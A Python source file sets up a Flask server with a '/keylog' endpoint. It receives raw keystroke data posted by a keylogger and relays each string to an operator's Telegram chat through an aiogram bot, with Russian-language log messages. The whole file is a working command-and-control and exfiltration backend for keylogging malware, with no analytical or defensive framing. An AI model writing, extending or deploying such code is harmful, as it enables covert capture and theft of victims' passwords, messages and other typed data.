from flask import Flask, request
from aiogram import Bot, Dispatcher
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties
from aiogram.fsm.storage.memory import MemoryStorage
import threading
import asyncio
import os

TOKEN = "your_token"
CHAT_ID = "chat_id"

app = Flask(__name__)


aiogram_loop = asyncio.new_event_loop()

bot = Bot(token=TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher(storage=MemoryStorage())


@app.route('/')
def index():
    return 'Сервер запущен и'


@app.route('/keylog', methods=['POST'])
def keylog():
    data = request.data.decode('utf-8')
    print(f"Полученная строка: {data}")

    asyncio.run_coroutine_threadsafe(
        bot.send_message(chat_id=CHAT_ID, text=data), aiogram_loop
    )
    return 'OK'

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)

async def main():

    await dp.start_polling(bot)

if __name__ == '__main__':

    flask_thread = threading.Thread(target=run_flask)
    flask_thread.start()

    asyncio.set_event_loop(aiogram_loop)
    aiogram_loop.run_until_complete(main())
